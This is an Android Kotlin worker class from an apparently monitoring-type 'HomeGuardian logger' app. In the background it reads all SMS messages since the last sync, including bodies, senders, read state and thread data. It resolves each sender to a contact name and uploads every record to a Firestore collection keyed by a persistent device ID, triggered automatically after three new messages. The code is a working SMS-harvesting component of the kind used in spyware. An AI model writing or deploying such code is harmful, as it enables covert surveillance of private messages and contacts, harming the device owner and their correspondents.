package com.mshomeguardian.logger.workers

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.mshomeguardian.logger.data.AppDatabase
import com.mshomeguardian.logger.data.MessageEntity
import com.mshomeguardian.logger.utils.DeviceIdentifier
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.*

class MessageWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    private val db = AppDatabase.getInstance(context.applicationContext)
    private val deviceId = DeviceIdentifier.getPersistentDeviceId(context.applicationContext)

    private val firestore: FirebaseFirestore? = try {
        FirebaseFirestore.getInstance()
    } catch (e: Exception) {
        Log.e(TAG, "Failed to initialize Firestore", e)
        null
    }

    companion object {
        private const val TAG = "MessageWorker"
        private const val SYNC_LIMIT = 500 // Limit number of messages to sync at once

        // New threshold for automatic synchronization
        private const val MESSAGE_COUNT_THRESHOLD = 3

        /**
         * Check if there are enough new messages to trigger a sync
         */
        suspend fun shouldSync(context: Context): Boolean {
            // Skip check if permission is not granted
            if (ContextCompat.checkSelfPermission(
                    context, Manifest.permission.READ_SMS
                ) != PackageManager.PERMISSION_GRANTED) {
                return false
            }

            try {
                val lastSyncTime = context.getSharedPreferences(
                    "message_sync", Context.MODE_PRIVATE).getLong("last_sync_time", 0)

                // Query the number of new messages since last sync
                val uri = Telephony.Sms.CONTENT_URI
                val projection = arrayOf(Telephony.Sms._ID)
                val selection = "${Telephony.Sms.DATE} > ?"
                val selectionArgs = arrayOf(lastSyncTime.toString())

                context.contentResolver.query(
                    uri, projection, selection, selectionArgs, null
                )?.use { cursor ->
                    val count = cursor.count
                    Log.d(TAG, "Found $count new messages since last sync")
                    return count >= MESSAGE_COUNT_THRESHOLD
                }

                return false
            } catch (e: Exception) {
                Log.e(TAG, "Error checking for new messages", e)
                return false
            }
        }
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        return@withContext try {
            // Check permissions
            if (ContextCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.READ_SMS
                ) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Missing READ_SMS permission")
                return@withContext Result.failure()
            }

            // Get last sync time from shared preferences
            val prefs = applicationContext.getSharedPreferences("message_sync", Context.MODE_PRIVATE)
            val lastSyncTime = prefs.getLong("last_sync_time", 0)
            val currentTime = System.currentTimeMillis()

            // Sync SMS messages
            val syncCount = syncMessages(lastSyncTime, currentTime)

            // Upload new records to Firestore
            uploadNewRecords()

            // Update last sync time if successful
            prefs.edit().putLong("last_sync_time", currentTime).apply()

            Log.d(TAG, "Message sync completed. Synced $syncCount records.")
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Error syncing messages", e)
            Result.retry()
        }
    }

    // Update the syncMessages method to fix the LIMIT issue
    private suspend fun syncMessages(lastSyncTime: Long, currentTime: Long): Int {
        val messages = mutableListOf<MessageEntity>()
        var cursor: Cursor? = null

        try {
            // Query SMS messages since last sync
            val uri = Telephony.Sms.CONTENT_URI
            val projection = arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.DATE,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ,
                Telephony.Sms.SEEN,
                Telephony.Sms.STATUS,
                Telephony.Sms.SUBJECT,
                Telephony.Sms.THREAD_ID,
                Telephony.Sms.PERSON,
                Telephony.Sms.PROTOCOL,
                Telephony.Sms.REPLY_PATH_PRESENT,
                Telephony.Sms.SERVICE_CENTER
            )

            // Selection for messages after the last sync time
            val selection = "${Telephony.Sms.DATE} > ?"
            val selectionArgs = arrayOf(lastSyncTime.toString())
            // Remove LIMIT from sortOrder
            val sortOrder = "${Telephony.Sms.DATE} DESC"

            cursor = applicationContext.contentResolver.query(
                uri, projection, selection, selectionArgs, sortOrder
            )

            cursor?.let {
                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
                val readIndex = it.getColumnIndex(Telephony.Sms.READ)
                val seenIndex = it.getColumnIndex(Telephony.Sms.SEEN)
                val statusIndex = it.getColumnIndex(Telephony.Sms.STATUS)
                val subjectIndex = it.getColumnIndex(Telephony.Sms.SUBJECT)
                val threadIdIndex = it.getColumnIndex(Telephony.Sms.THREAD_ID)
                val personIndex = it.getColumnIndex(Telephony.Sms.PERSON)
                val protocolIndex = it.getColumnIndex(Telephony.Sms.PROTOCOL)
                val replyPathPresentIndex = it.getColumnIndex(Telephony.Sms.REPLY_PATH_PRESENT)
                val serviceCenterIndex = it.getColumnIndex(Telephony.Sms.SERVICE_CENTER)

                // Add counter to limit records processed
                var recordsProcessed = 0

                while (it.moveToNext() && recordsProcessed < SYNC_LIMIT) {
                    val messageId = if (idIndex >= 0) it.getString(idIndex) else UUID.randomUUID().toString()
                    val address = if (addressIndex >= 0) it.getString(addressIndex) ?: "" else ""
                    val date = if (dateIndex >= 0) it.getLong(dateIndex) else currentTime
                    val body = if (bodyIndex >= 0) it.getString(bodyIndex) else null
                    val type = if (typeIndex >= 0) it.getInt(typeIndex) else Telephony.Sms.MESSAGE_TYPE_INBOX
                    val read = if (readIndex >= 0) it.getInt(readIndex) == 1 else false
                    val seen = if (seenIndex >= 0) it.getInt(seenIndex) == 1 else false
                    val status = if (statusIndex >= 0) it.getInt(statusIndex) else null
                    val subject = if (subjectIndex >= 0) it.getString(subjectIndex) else null
                    val threadId = if (threadIdIndex >= 0) it.getLong(threadIdIndex) else null
                    val person = if (personIndex >= 0) it.getString(personIndex) else null
                    val protocol = if (protocolIndex >= 0) it.getInt(protocolIndex) else null
                    val replyPathPresent = if (replyPathPresentIndex >= 0) it.getInt(replyPathPresentIndex) == 1 else null
                    val serviceCenter = if (serviceCenterIndex >= 0) it.getString(serviceCenterIndex) else null

                    // Look up contact name if available
                    val contactName = getContactNameFromNumber(address)

                    // Create message entity
                    val messageEntity = MessageEntity(
                        messageId = messageId,
                        syncTimestamp = currentTime,
                        phoneNumber = address,
                        timestamp = date,
                        body = body,
                        type = type,
                        subject = subject,
                        messageType = "SMS",
                        contactName = contactName,
                        isRead = read,
                        seen = seen,
                        deliveryStatus = status,
                        errorCode = null,
                        deletedLocally = false,
                        uploadedToCloud = false,
                        thread_id = threadId,
                        person = person,
                        protocol = protocol,
                        replyPathPresent = replyPathPresent,
                        serviceCenter = serviceCenter,
                        status = status,
                        deviceId = deviceId
                    )

                    // Check if message already exists
                    val existingMessage = db.messageDao().getMessageByMessageId(messageId)
                    if (existingMessage == null) {
                        messages.add(messageEntity)
                    } else {
                        // Update only if something changed
                        if (existingMessage.isRead != read ||
                            existingMessage.seen != seen ||
                            existingMessage.body != body) {

                            // Keep existing flags
                            db.messageDao().updateMessage(messageEntity.copy(
                                id = existingMessage.id,
                                uploadedToCloud = existingMessage.uploadedToCloud,
                                uploadTimestamp = existingMessage.uploadTimestamp
                            ))
                        }
                    }

                    recordsProcessed++
                }
            }

            // Insert all new messages
            if (messages.isNotEmpty()) {
                db.messageDao().insertMessages(messages)
                Log.d(TAG, "Inserted ${messages.size} new messages")
            }

            return messages.size
        } catch (e: Exception) {
            Log.e(TAG, "Error querying messages", e)
            throw e
        } finally {
            cursor?.close()
        }
    }


    private fun getContactNameFromNumber(phoneNumber: String): String? {
        if (phoneNumber.isBlank()) return null

        val uri = Uri.withAppendedPath(
            android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
            Uri.encode(phoneNumber)
        )

        val projection = arrayOf(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME)

        return try {
            applicationContext.contentResolver.query(
                uri, projection, null, null, null
            )?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val nameIndex = cursor.getColumnIndex(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME)
                    if (nameIndex >= 0) cursor.getString(nameIndex) else null
                } else null
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error looking up contact name", e)
            null
        }
    }

    private suspend fun uploadNewRecords() {
        val firestoreInstance = firestore ?: return

        try {
            // Get messages that haven't been uploaded
            val notUploadedMessages = db.messageDao().getNotUploadedMessages()
            Log.d(TAG, "Found ${notUploadedMessages.size} messages to upload")

            for (message in notUploadedMessages) {
                try {
                    // Upload to Firestore
                    firestoreInstance.collection("devices")
                        .document(deviceId)
                        .collection("messages")
                        .document(message.messageId)
                        .set(message, SetOptions.merge())
                        .addOnSuccessListener {
                            // Mark as uploaded in a separate coroutine to avoid blocking
                            GlobalScope.launch(Dispatchers.IO) {
                                val uploadTime = System.currentTimeMillis()
                                db.messageDao().markMessageAsUploaded(message.id, uploadTime)
                                Log.d(TAG, "Message ${message.messageId} marked as uploaded")
                            }
                        }
                        .addOnFailureListener { e ->
                            Log.e(TAG, "Failed to upload message ${message.messageId}", e)
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "Error uploading message ${message.messageId}", e)
                    // Continue with next record
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in uploadNewRecords", e)
        }
    }
}